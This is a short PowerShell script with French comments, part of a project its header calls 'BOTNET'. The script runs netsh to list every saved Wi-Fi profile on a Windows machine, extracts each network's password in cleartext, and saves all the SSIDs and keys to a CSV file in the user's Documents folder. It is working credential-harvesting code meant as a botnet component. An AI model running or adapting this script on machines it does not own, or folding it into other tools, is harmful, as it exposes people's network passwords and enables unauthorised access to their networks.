#######################
# Projet BOTNET
# Date de creation: 10/01/2018
# Version: 0.1
# Auteur: Paul RICHIARDI
#
# Description: Permet de stocker dans un CSV l'ensemble des réseaux WIFI et leurs clés où l'utilisateur s'est déjà connecté
#
#######################


### Commandes principales 

# netsh wlan show profiles 
# netsh wlan show profile name=<profile> key=clear


$User = "$Env:Username" # Récupère l'utilisateur courant de la session

$wifi=@() # Creation de tableau

# Visualisation des SSID de réseaux bloqués
$SSIDBlocked=netsh wlan show blockednetworks

#Liste l'ensemble des SSID
$SSIDList=netsh wlan show profiles

ForEach($item1 in $SSIDList)
{
    #Récupération des SSID par expression régulière
    If($item1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$')
    {
        $ssid=$Matches[1]
        $SSIDListKey=netsh wlan show profiles $ssid key=clear
        ForEach($item2 in $SSIDListKey)
        {
            #Récupération des clés par expression régulière
            If($item2 -match 'Contenu de la c[^:]+:.(.+)$')
            {
                $key=$Matches[1]
                #Stockage des SSID et clés dans un tableau
                $wifi+=[PSCustomObject]@{ssid=$ssid;key=$key}
            }
        }
    }
}

#Export du tableau dans un fichier csv
$pathfile = 'C:\Users\'+$User+'\Documents\wifi.csv' #Création du chemin du fichier selon le nom de l'user
$wifi|Export-CSV -Path $pathfile -NoTypeInformation #Export du CSV
